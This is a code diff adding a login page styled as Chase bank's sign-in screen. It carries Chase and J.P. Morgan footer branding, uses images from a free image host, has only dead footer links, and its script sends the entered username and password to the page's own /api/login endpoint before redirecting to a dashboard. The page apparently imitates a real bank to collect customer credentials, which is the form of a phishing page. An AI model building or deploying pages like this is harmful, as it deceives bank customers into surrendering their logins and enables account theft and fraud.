@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* --- CSS STYLES --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* Fixed Background Image */
+        .background-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.ibb.co/qY1fbv7z/IMG-3782.jpg') no-repeat center center/cover;
+            z-index: -1;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            width: 100%;
+        }
+
+        /* Logo Styling */
+        .logo-container {
+            margin-bottom: 30px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .app-logo {
+            max-width: 200px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Login Card Styling */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        /* Border-bottom style inputs */
+        .input-group input {
+            width: 100%;
+            padding: 10px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+            background: transparent;
+            border-radius: 0;
+        }
+
+        /* Floating Labels */
+        .input-group label {
+            position: absolute;
+            top: 10px;
+            left: 0;
+            font-size: 16px;
+            color: #666;
+            pointer-events: none;
+            transition: 0.3s ease all;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:valid ~ label {
+            top: -15px;
+            font-size: 13px;
+            color: #005eb8;
+        }
+
+        /* Password Toggle */
+        .show-password {
+            position: absolute;
+            right: 0;
+            top: 10px;
+            color: #005eb8;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Checkbox Row */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-container input {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #005eb8;
+        }
+
+        .checkbox-container label {
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        /* Sign In Button */
+        .sign-in-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #005eb8;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background 0.3s;
+        }
+
+        .sign-in-btn:hover {
+            background-color: #004494;
+        }
+
+        /* Links */
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .links a {
+            text-decoration: none;
+            color: #005eb8;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Footer Styling */
+        .footer {
+            background-color: #ffffff;
+            padding: 30px 20px;
+            text-align: center;
+            width: 100%;
+            border-top: 1px solid #ddd;
+        }
+
+        .social-icons {
+            margin-bottom: 20px;
+        }
+
+        .social-icons i {
+            font-size: 20px;
+            color: #555;
+            margin: 0 12px;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            margin-bottom: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            text-decoration: none;
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright p {
+            font-size: 11px;
+            color: #777;
+            margin-top: 10px;
+        }
+        
+        /* Error Message */
+        .error-message {
+            color: red;
+            font-size: 13px;
+            margin-bottom: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-overlay"></div>
+
+    <div class="main-container">
+        <div class="logo-container">
+            <img src="https://i.ibb.co/wNCTy1Hk/IMG-3783.jpg" alt="Logo" class="app-logo">
+        </div>
+
+        <div class="login-card">
+            <form id="loginForm">
+                <div id="error-msg" class="error-message"></div>
+                
+                <div class="input-group">
+                    <input type="text" id="username" required>
+                    <label for="username">Username</label>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" required>
+                    <label for="password">Password</label>
+                    <span class="show-password" onclick="togglePassword()">Show</span>
+                </div>
+
+                <div class="options-row">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="token">
+                        <label for="token">Use token</label>
+                    </div>
+                </div>
+
+                <button type="submit" class="sign-in-btn" id="btn-login">Sign in</button>
+
+                <div class="links">
+                    <a href="#">Forgot username/password? <i class="fas fa-chevron-right"></i></a>
+                    <a href="register.html">Not enrolled? Sign up now. <i class="fas fa-chevron-right"></i></a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="social-icons">
+            <i class="fab fa-facebook-f"></i>
+            <i class="fab fa-instagram"></i>
+            <i class="fab fa-twitter"></i> 
+            <i class="fab fa-youtube"></i>
+            <i class="fab fa-linkedin-in"></i>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Contact us</a>
+            <a href="#">Privacy & security</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Accessibility</a>
+            <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+            <a href="#">Fair Lending</a>
+            <a href="#">About Chase</a>
+            <a href="#">J.P. Morgan</a>
+            <a href="#">JPMorgan Chase & Co.</a>
+            <a href="#">Careers</a>
+            <a href="#">Español</a>
+        </div>
+        
+        <div class="copyright">
+            <p>&copy; 2025 Chase. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.querySelector('.show-password');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = document.getElementById('btn-login');
+            const errorDiv = document.getElementById('error-msg');
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            btn.textContent = 'Signing in...';
+            btn.disabled = true;
+            errorDiv.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await res.json();
+                
+                if(data.success) {
+                    // Success! Save ID and go to dashboard
+                    localStorage.setItem('chase_user_id', data.userId);
+                    window.location.href = 'user-dashboard.html';
+                } else {
+                    // Show error
+                    errorDiv.textContent = data.message || 'Invalid credentials.';
+                    errorDiv.style.display = 'block';
+                    btn.textContent = 'Sign in';
+                    btn.disabled = false;
+                }
+            } catch(err) {
+                console.error(err);
+                errorDiv.textContent = 'Connection error.';
+                errorDiv.style.display = 'block';
+                btn.textContent = 'Sign in';
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
+
+
